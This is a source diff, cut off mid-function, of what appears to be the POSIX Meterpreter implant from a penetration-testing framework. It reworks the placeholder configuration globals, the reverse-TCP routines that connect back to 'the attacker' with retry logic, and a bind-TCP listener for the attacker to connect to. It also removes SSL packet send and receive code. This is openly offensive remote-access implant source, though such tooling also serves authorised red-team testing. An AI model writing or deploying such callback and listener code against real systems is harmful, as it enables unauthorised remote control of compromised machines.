+++ source/server/server_setup_posix.c
@@ -4,23 +4,23 @@
 #include "metsrv.h"
 #include "../../common/common.h"
 #include <netdb.h>
-#include <netinet/in.h>
 
-// #define DEBUGTRACE 1
+const DWORD RETRY_TIMEOUT_MS = 1000;
 
-#define TRANSPORT_ID_OFFSET 22
-
-MetsrvConfigData global_config =
-{
-	.transport = "METERPRETER_TRANSPORT_SSL\x00\x00",
-	.url = "https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00\x00",
-	.ua = "METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-	.proxy = "METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-	.proxy_username = "METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-	.proxy_password = "METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-	.ssl_cert_hash = "METERPRETER_SSL_CERT_HASH\x00\x00\x00",
-	.timeouts.values = { .expiry = 24*3600*7, .comms = 300, .retry_total = 3600, .retry_wait = 10 }
-};
+char *global_meterpreter_transport =
+	"METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+char *global_meterpreter_url =
+	"https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
+char *global_meterpreter_ua =
+	"METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+char *global_meterpreter_proxy =
+	"METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+char *global_meterpreter_proxy_username =
+	"METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+char *global_meterpreter_proxy_password =
+	"METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+int global_expiration_timeout = 0xb64be661;
+int global_comm_timeout = 0xaf79257f;
 
 #define SetHandleInformation(a, b, c)
 const unsigned int hAppInstance = 0x504b5320;	// 'PKS '
@@ -29,100 +29,54 @@ const unsigned int hAppInstance = 0x504b5320;	// 'PKS '
 static LOCK **ssl_locks = NULL;
 
 /*!
- * @brief Perform the reverse_tcp connect.
- * @param reverseSocket The existing socket that refers to the remote host connection, closed on failure.
- * @param sockAddr The SOCKADDR structure which contains details of the connection.
- * @param sockAddrSize The size of the \c sockAddr structure.
- * @param retryTotal The number of seconds to continually retry for.
- * @param retryWait The number of seconds between each connect attempt.
- * @param expiry The session expiry time.
- * @return Indication of success or failure.
- */
-static DWORD reverse_tcp_run(SOCKET reverseSocket, struct sockaddr* sockAddr, int sockAddrSize, DWORD retryTotal, DWORD retryWait, int expiry)
-{
-	DWORD result = ERROR_SUCCESS;
-	int start = current_unix_timestamp();
-
-	do
-	{
-		int retryStart = current_unix_timestamp();
-		if ((result = connect(reverseSocket, sockAddr, sockAddrSize)) != SOCKET_ERROR)
-		{
-			break;
-		}
-
-		// has our session expired?
-		if (current_unix_timestamp() >= expiry)
-		{
-			break;
-		}
-
-		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
-		sleep(retryWait);
-	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);
-
-	if (result == SOCKET_ERROR)
-	{
-		closesocket(reverseSocket);
-	}
-
-	return result;
-}
-
-/*!
  * @brief Connects to a provided host/port (IPv4), downloads a payload and executes it.
  * @param host String containing the name or IP of the host to connect to.
  * @param port Port number to connect to.
- * @param retryTotal The number of seconds to continually retry for.
- * @param retryWait The number of seconds between each connect attempt.
- * @param expiry The session expiry time.
- * @return Indication of success or failure.
+ * @param retryAttempts The number of times to attempt to retry.
  */
-static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWORD retryWait, int expiry, SOCKET* socketBuffer)
+DWORD reverse_tcp4(const char* host, u_short port, short retryAttempts, SOCKET* socketBuffer)
 {
+	*socketBuffer = 0;
+
 	// prepare to connect to the attacker
-	DWORD result = ERROR_SUCCESS;
 	SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	struct hostent* target = gethostbyname(host);
 	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);
 
 	struct sockaddr_in sock = { 0 };
-
 	sock.sin_addr.s_addr = inet_addr(targetIp);
 	sock.sin_family = AF_INET;
 	sock.sin_port = htons(port);
-	*socketBuffer = 0;
 
-	result = reverse_tcp_run(socketHandle, (struct sockaddr*)&sock, sizeof(sock), retryTotal, retryWait, expiry);
-
-	if (result == ERROR_SUCCESS)
+	// try connect to the attacker at least once
+	while (connect(socketHandle, (struct sockaddr*)&sock, sizeof(sock)) == SOCKET_ERROR)
 	{
-		*socketBuffer = socketHandle;
+		// retry with a Sleep if it fails, or exit the process on failure
+		if (retryAttempts-- <= 0)
+		{
+			return WSAGetLastError();
+		}
+
+		sleep(RETRY_TIMEOUT_MS);
 	}
 
-	return result;
-}
+	*socketBuffer = socketHandle;
 
+	return ERROR_SUCCESS;
+}
 
 /*!
  * @brief Connects to a provided host/port (IPv6), downloads a payload and executes it.
  * @param host String containing the name or IP of the host to connect to.
  * @param service The target service/port.
  * @param scopeId IPv6 scope ID.
- * @param retryTotal The number of seconds to continually retry for.
- * @param retryWait The number of seconds between each connect attempt.
- * @param expiry Session expiry time.
- * @return Indication of success or failure.
+ * @param retryAttempts The number of times to attempt to retry.
  */
-static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, DWORD retryTotal, DWORD retryWait, int expiry, SOCKET* socketBuffer)
+DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, short retryAttempts, SOCKET* socketBuffer)
 {
-	int start;
-	DWORD result = ERROR_SUCCESS;
-	SOCKET socketHandle;
-	struct addrinfo hints = { 0 };
-
 	*socketBuffer = 0;
 
+	struct addrinfo hints = { 0 };
 	hints.ai_family = AF_INET6;
 	hints.ai_socktype = SOCK_STREAM;
 	hints.ai_protocol = IPPROTO_TCP;
@@ -130,23 +84,24 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 	struct addrinfo* addresses;
 	if (getaddrinfo(host, service, &hints, &addresses) != 0)
 	{
-		return errno;
+		return WSAGetLastError();
 	}
 
+
 	// prepare to connect to the attacker
-	socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
+	SOCKET socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
 
 	if (socketHandle == INVALID_SOCKET)
 	{
 		dprintf("[STAGELESS IPV6] failed to connect to attacker");
-		return errno;
+		return WSAGetLastError();
 	}
 
-	start = current_unix_timestamp();
-	do
+	dprintf("[STAGELESS IPV6] Socket successfully created");
+	while (retryAttempts-- > 0)
 	{
-		struct addrinfo* address = NULL;
-		int retryStart = current_unix_timestamp();
+    struct addrinfo* address = NULL;
+		dprintf("[STAGELESS IPV6] Attempt %u", retryAttempts + 1);
 		for (address = addresses; address != NULL; address = address->ai_next)
 		{
 			((struct sockaddr_in6*)address->ai_addr)->sin6_scope_id = scopeId;
@@ -160,79 +115,13 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 			}
 		}
 
-		// has our session expired?
-		if (current_unix_timestamp() >= expiry)
-		{
-			break;
-		}
-
-		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
-		sleep(retryWait);
-	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);
+		sleep(RETRY_TIMEOUT_MS);
+	}
 
 	closesocket(socketHandle);
 	freeaddrinfo(addresses);
+	return WSAGetLastError();
 
-	return errno;
-}
-
-/*!
- * @brief Perform the bind_tcp process.
- * @param listenSocket The existing listen socket that refers to the remote host connection, closed before returning.
- * @param sockAddr The SOCKADDR structure which contains details of the connection.
- * @param sockAddrSize The size of the \c sockAddr structure.
- * @param acceptSocketBuffer Buffer that will receive the accepted socket handle on success.
- * @return Indication of success or failure.
- */
-static DWORD bind_tcp_run(SOCKET listenSocket, struct sockaddr* sockAddr, int sockAddrSize, SOCKET* acceptSocketBuffer)
-{
-	SOCKET acceptSocket;
-	DWORD result = ERROR_SUCCESS;
-
-	do
-	{
-		int yes = 1;
-		if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) != 0)
-		{
-			dprintf("[BIND RUN] Failed to set sock opt: %u", errno);
-			result = errno;
-			break;
-		}
-
-		if (bind(listenSocket, sockAddr, sockAddrSize) == SOCKET_ERROR)
-		{
-			dprintf("[BIND RUN] Socket failed to bind: %u", errno);
-			result = errno;
-			break;
-		}
-
-		dprintf("[BIND RUN] Socket bound successfully");
-
-		if (listen(listenSocket, 1) == SOCKET_ERROR)
-		{
-			result = errno;
-			break;
-		}
-
-		dprintf("[BIND RUN] Listening ...");
-
-		// Setup, ready to go, now wait for the connection.
-		acceptSocket = accept(listenSocket, NULL, NULL);
-
-		if (acceptSocket == INVALID_SOCKET)
-		{
-			result = errno;
-			break;
-		}
-
-		dprintf("[BIND RUN] Valid socket accepted %u", acceptSocket);
-
-		*acceptSocketBuffer = acceptSocket;
-	} while (0);
-
-	closesocket(listenSocket);
-
-	return result;
 }
 
 /*!
@@ -243,54 +132,37 @@ DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 {
 	*socketBuffer = 0;
 
-	// prepare a connection listener for the attacker to connect to, and we
-	// attempt to bind to both ipv6 and ipv4 by default, and fallback to ipv4
-	// only if the process fails.
-	BOOL v4Fallback = FALSE;
-	SOCKET listenSocket = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
+	// prepare a connection listener for the attacker to connect to
+	SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
-	if (listenSocket == INVALID_SOCKET)
+	struct sockaddr_in sock = { 0 };
+	sock.sin_addr.s_addr = inet_addr("0.0.0.0");
+	sock.sin_family = AF_INET;
+	sock.sin_port = htons(port);
+
+	if (bind(listenSocket, (struct sockaddr*)&sock, sizeof(sock)) == SOCKET_ERROR)
 	{
-		dprintf("[BIND] Unable to create IPv6 socket");
-		v4Fallback = TRUE;
-	}
-	else
-	{
-		int no = 0;
-		if (setsockopt(listenSocket, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&no, sizeof(no)) == SOCKET_ERROR)
-		{
-			// fallback to ipv4 - we're probably running on Windows XP or earlier here, which means that to
-			// support IPv4 and IPv6 we'd need to create two separate sockets. IPv6 on XP isn't that common
-			// so instead, we'll just revert back to v4 and listen on that one address instead.
-			dprintf("[BIND] Unable to remove IPV6_ONLY option");
-			closesocket(listenSocket);
-			v4Fallback = TRUE;
-		}
+		return WSAGetLastError();
 	}
 
-	if (v4Fallback)
+	if (listen(listenSocket, 1) == SOCKET_ERROR)
 	{
-		dprintf("[BIND] Falling back to IPV4");
-		listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+		return WSAGetLastError();
 	}
 
-	struct sockaddr_in6 sockAddr = { 0 };
+	// Setup, ready to go, now wait for the connection.
+	SOCKET acceptSocket = accept(listenSocket, NULL, NULL);
 
-	if (v4Fallback)
+	// don't bother listening for other connections
+	closesocket(listenSocket);
+
+	if (acceptSocket == INVALID_SOCKET)
 	{
-		struct sockaddr_in* v4Addr = (struct sockaddr_in*)&sockAddr;
-		v4Addr->sin_addr.s_addr = htons(INADDR_ANY);
-		v4Addr->sin_family = AF_INET;
-		v4Addr->sin_port = htons(port);
-	}
-	else
-	{
-		sockAddr.sin6_addr = in6addr_any;
-		sockAddr.sin6_family = AF_INET6;
-		sockAddr.sin6_port = htons(port);
+		return WSAGetLastError();
 	}
 
-	return bind_tcp_run(listenSocket, (struct sockaddr*)&sockAddr, v4Fallback ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6), socketBuffer);
+	*socketBuffer = acceptSocket;
+	return ERROR_SUCCESS;
 }
 
 
@@ -310,6 +182,11 @@ static void server_locking_callback(int mode, int type, const char *file, int li
 	}
 }
 
+SOCKET tcp_transport_get_socket(Transport* transport)
+{
+	return ((TcpTransportContext*)transport->ctx)->fd;
+}
+
 /*!
  * @brief A callback function used by OpenSSL to get the current threads id.
  * @returns The current thread ID.
@@ -320,23 +197,16 @@ static long unsigned int server_threadid_callback(void)
 	return pthread_self();
 }
 
-/*!
- * @brief A callback function for dynamic lock creation for OpenSSL.
- * @returns A pointer to a lock that can be used for synchronisation.
- * @param file _Ignored_
- * @param line _Ignored_
+/*
+ * Callback function for dynamic lock creation for OpenSSL.
  */
 static struct CRYPTO_dynlock_value *server_dynamiclock_create(const char *file, int line)
 {
 	return (struct CRYPTO_dynlock_value *)lock_create();
 }
 
-/*!
- * @brief A callback function for dynamic lock locking for OpenSSL.
- * @param mode A bitmask which indicates the lock mode.
- * @param l A point to the lock instance.
- * @param file _Ignored_
- * @param line _Ignored_
+/*
+ * Callback function for dynamic lock locking for OpenSSL.
  */
 static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value *l, const char *file,
 	int line)
@@ -349,20 +219,16 @@ static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value *l, co
 	}
 }
 
-/*!
- * @brief A callback function for dynamic lock destruction for OpenSSL.
- * @param l A point to the lock instance.
- * @param file _Ignored_
- * @param line _Ignored_
+/*
+ * Callback function for dynamic lock destruction for OpenSSL.
  */
 static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value *l, const char *file, int line)
 {
 	lock_destroy((LOCK *) l);
 }
 
-/*!
- * @brief Flush all pending data on the connected socket before doing SSL.
- * @param remote Pointer to the remote instance.
+/*
+ * Flush all pending data on the connected socket before doing SSL.
  */
 static void server_socket_flush(Remote * remote)
 {
@@ -396,11 +262,8 @@ static void server_socket_flush(Remote * remote)
 	lock_release(remote->lock);
 }
 
-/*!
- * @brief Poll a socket for data to recv and block when none available.
- * @param remote Pointer to the remote instance.
- * @param timeout Amount of time to wait before the poll times out (in milliseconds).
- * @return Indication of success or failure.
+/*
+ * Poll a socket for data to recv and block when none available.
  */
 static LONG server_socket_poll(Remote * remote, long timeout)
 {
@@ -416,18 +279,16 @@ static LONG server_socket_poll(Remote * remote, long timeout)
 	tv.tv_usec = timeout;
 	result = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
 
-	if (result == -1 && (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)) {
+	if (result == -1 &&
+	    (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK))
 		result = 0;
-	}
 
 	lock_release(remote->lock);
 	return result;
 }
 
-/*!
- * @brief Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
- * @param remote Pointer to the remote instance.
- * @return Indication of success or failure.
+/*
+ * Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
  */
 static int server_initialize_ssl(Remote * remote)
 {
@@ -443,14 +304,13 @@ static int server_initialize_ssl(Remote * remote)
 	// Setup the required OpenSSL multi-threaded enviroment...
 	ssl_locks = malloc(CRYPTO_num_locks() * sizeof(LOCK *));
 	if (ssl_locks == NULL) {
-			dprintf("[SSL INIT] failed to allocate locks (%d locks)", CRYPTO_num_locks());
+    dprintf("[SSL INIT] failed to allocate locks (%d locks)", CRYPTO_num_locks());
 		lock_release(remote->lock);
 		return -1;
 	}
 
-	for (i = 0; i < CRYPTO_num_locks(); i++) {
+	for (i = 0; i < CRYPTO_num_locks(); i++)
 		ssl_locks[i] = lock_create();
-	}
 
 	CRYPTO_set_id_callback(server_threadid_callback);
 	CRYPTO_set_locking_callback(server_locking_callback);
@@ -462,10 +322,8 @@ static int server_initialize_ssl(Remote * remote)
 	return 0;
 }
 
-/*!
- * @brief Bring down the OpenSSL subsystem
- * @param remote Pointer to the remote instance.
- * @return Indication of success or failure.
+/*
+ * Bring down the OpenSSL subsystem
  */
 BOOL server_destroy_ssl(Remote * remote)
 {
@@ -486,21 +344,18 @@ BOOL server_destroy_ssl(Remote * remote)
 		CRYPTO_set_dynlock_lock_callback(NULL);
 		CRYPTO_set_dynlock_destroy_callback(NULL);
 
-		for (i = 0; i < CRYPTO_num_locks(); i++) {
+		for (i = 0; i < CRYPTO_num_locks(); i++)
 			lock_destroy(ssl_locks[i]);
-		}
 
 		free(ssl_locks);
 		lock_release(remote->lock);
 	}
 
-	return TRUE;
+  return TRUE;
 }
 
-/*!
- * @brief Negotiate SSL on the socket.
- * @param remote Pointer to the remote instance.
- * @return Indication of success or failure.
+/*
+ * Negotiate SSL on the socket.
  */
 static BOOL server_negotiate_ssl(Remote * remote)
 {
@@ -547,304 +402,9 @@ static BOOL server_negotiate_ssl(Remote * remote)
 out:
 	lock_release(remote->lock);
 	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);
-	if (ret < 0) {
+	if (ret < 0)
 		success = FALSE;
-	}
 	return success;
-}
-
-/*!
- * @brief Transmit a packet via SSL _and_ destroy it.
- * @param remote Pointer to the \c Remote instance.
- * @param packet Pointer to the \c Packet that is to be sent.
- * @param completion Pointer to the completion routines to process.
- * @return An indication of the result of processing the transmission request.
- * @remark This uses an SSL-encrypted TCP channel, and does not imply the use of HTTPS.
- */
-DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompletion* completion)
-{
-	CryptoContext* crypto;
-	Tlv requestId;
-	DWORD res;
-	DWORD idx;
-	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
-
-	lock_acquire(remote->lock);
-
-	// If the packet does not already have a request identifier, create one for it
-	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
-	{
-		DWORD index;
-		CHAR rid[32];
-
-		rid[sizeof(rid)-1] = 0;
-
-		for (index = 0; index < sizeof(rid)-1; index++)
-		{
-			rid[index] = (rand() % 0x5e) + 0x21;
-		}
-
-		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
-	}
-
-	do
-	{
-		// If a completion routine was supplied and the packet has a request
-		// identifier, insert the completion routine into the list
-		if ((completion) &&
-			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
-			&requestId) == ERROR_SUCCESS))
-		{
-			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
-		}
-
-		// If the endpoint has a cipher established and this is not a plaintext
-		// packet, we encrypt
-		if ((crypto = remote_get_cipher(remote)) &&
-			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
-			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
-		{
-			ULONG origPayloadLength = packet->payloadLength;
-			PUCHAR origPayload = packet->payload;
-
-			// Encrypt
-			if ((res = crypto->handlers.encrypt(crypto, packet->payload,
-				packet->payloadLength, &packet->payload,
-				&packet->payloadLength)) !=
-				ERROR_SUCCESS)
-			{
-				SetLastError(res);
-				break;
-			}
-
-			// Destroy the original payload as we no longer need it
-			free(origPayload);
-
-			// Update the header length
-			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
-		}
-
-		idx = 0;
-		while (idx < sizeof(packet->header))
-		{
-			// Transmit the packet's header (length, type)
-			res = SSL_write(
-				ctx->ssl,
-				(LPCSTR)(&packet->header) + idx,
-				sizeof(packet->header) - idx
-				);
-
-			if (res <= 0)
-			{
-				dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
-				break;
-			}
-			idx += res;
-		}
-
-		if (res < 0)
-		{
-			break;
-		}
-
-		idx = 0;
-		while (idx < packet->payloadLength)
-		{
-			// Transmit the packet's payload (length, type)
-			res = SSL_write(
-				ctx->ssl,
-				packet->payload + idx,
-				packet->payloadLength - idx
-				);
-
-			if (res < 0)
-			{
-				break;
-			}
-
-			idx += res;
-		}
-
-		if (res < 0)
-		{
-			dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
-			break;
-		}
-
-		SetLastError(ERROR_SUCCESS);
-	} while (0);
-
-	res = GetLastError();
-
-	// Destroy the packet
-	packet_destroy(packet);
-
-	lock_release(remote->lock);
-
-	return res;
-}
-
-/*!
- * @brief Receive a new packet on the given remote endpoint.
- * @param remote Pointer to the \c Remote instance.
- * @param packet Pointer to a pointer that will receive the \c Packet data.
- * @return An indication of the result of processing the transmission request.
- */
-static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
-{
-	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
-	CryptoContext *crypto = NULL;
-	Packet *localPacket = NULL;
-	TlvHeader header;
-	LONG bytesRead;
-	BOOL inHeader = TRUE;
-	PUCHAR payload = NULL;
-	ULONG payloadLength;
-	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
-
-	lock_acquire(remote->lock);
-
-	do
-	{
-		// Read the packet length
-		while (inHeader)
-		{
-			if ((bytesRead = SSL_read(ctx->ssl, ((PUCHAR)&header + headerBytes), sizeof(TlvHeader)-headerBytes)) <= 0)
-			{
-				if (!bytesRead)
-				{
-					SetLastError(ERROR_NOT_FOUND);
-				}
-
-				if (bytesRead < 0)
-				{
-					dprintf("[PACKET] receive header failed with error code %d. SSLerror=%d, WSALastError=%d\n", bytesRead, SSL_get_error(ctx->ssl, bytesRead), WSAGetLastError());
-					SetLastError(ERROR_NOT_FOUND);
-				}
-
-				break;
-			}
-
-			headerBytes += bytesRead;
-
-			if (headerBytes != sizeof(TlvHeader))
-			{
-				continue;
-			}
-
-			inHeader = FALSE;
-		}
-
-		if (headerBytes != sizeof(TlvHeader))
-		{
-			break;
-		}
-
-		// Initialize the header
-		header.length = header.length;
-		header.type = header.type;
-		payloadLength = ntohl(header.length) - sizeof(TlvHeader);
-		payloadBytesLeft = payloadLength;
-
-		// Allocate the payload
-		if (!(payload = (PUCHAR)malloc(payloadLength)))
-		{
-			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
-			break;
-		}
-
-		// Read the payload
-		while (payloadBytesLeft > 0)
-		{
-			if ((bytesRead = SSL_read(ctx->ssl, payload + payloadLength - payloadBytesLeft, payloadBytesLeft)) <= 0)
-			{
-
-				if (GetLastError() == WSAEWOULDBLOCK)
-				{
-					continue;
-				}
-
-				if (!bytesRead)
-				{
-					SetLastError(ERROR_NOT_FOUND);
-				}
-
-				if (bytesRead < 0)
-				{
